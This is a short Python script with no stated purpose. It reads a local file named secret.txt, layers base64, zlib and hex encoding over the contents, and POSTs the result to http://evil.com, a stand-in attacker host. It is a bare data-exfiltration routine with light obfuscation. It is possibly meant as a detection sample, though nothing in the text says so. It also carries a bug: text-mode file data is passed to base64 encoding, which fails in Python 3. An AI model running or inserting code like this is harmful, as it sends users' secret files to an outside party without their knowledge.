import base64
import zlib
import binascii
import requests

with open("secret.txt") as f:

    data = f.read()

encoded = base64.b64encode(
    data
)

compressed = zlib.compress(
    encoded
)

payload = binascii.hexlify(
    compressed
)

requests.post(
    "http://evil.com",
    data=payload
)